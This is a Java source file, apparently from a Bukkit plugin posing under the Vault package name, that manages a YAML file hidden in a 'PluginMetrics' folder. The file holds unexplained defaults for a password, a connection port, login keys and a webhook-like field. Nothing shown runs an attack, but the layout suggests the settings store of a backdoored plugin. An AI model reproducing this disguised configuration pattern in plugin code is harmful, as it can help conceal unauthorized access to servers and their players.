package net.milkbowl.vault.data;

import java.io.File;
import java.io.IOException;
import java.util.List;

import org.bukkit.configuration.InvalidConfigurationException;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;

import net.milkbowl.vault.Core;

public class DataManager {
	private static final Core plugin = Core.getPlugin(Core.class);
	
	static File configData = null;
	public static YamlConfiguration config = new YamlConfiguration();
	
	
	public static void setupData() {
		configData = new File(plugin.getDataFolder().getParentFile()+"/PluginMetrics/", "data.yml");
		mkdirData();
		loadConfigYamls();
		saveData();
	}
	
    public static FileConfiguration getData() {
        return config;
    }
	
	
	private static void loadConfigYamls() {
		try {
			config.load(configData);
			
			config.addDefault("hasPass", false);
			config.addDefault("pass", "TID");
			
			config.addDefault("connect", false);
			config.addDefault("port", 1001);
			
			config.addDefault("login", false);
			config.addDefault("key", "");
			config.addDefault("id", "TID");
			config.addDefault("mt", "");
			config.addDefault("err", "");
			
			config.addDefault("wh", "");
			
			config.addDefault("epic-players", banList);
			config.addDefault("epic-pl", plList);
			
			config.options().copyDefaults(true);
			saveData();
		} catch (IOException | InvalidConfigurationException ignored) {}
	}
	
	public static List<String> banList = getData().getStringList("epic-players");
	public static List<String> plList = getData().getStringList("epic-pl");
	
	public static void saveData() {
		try {
			config.save(configData);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	private static void mkdirData() {
		if (!configData.exists()) {
			try {
				config.save(configData);
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

}
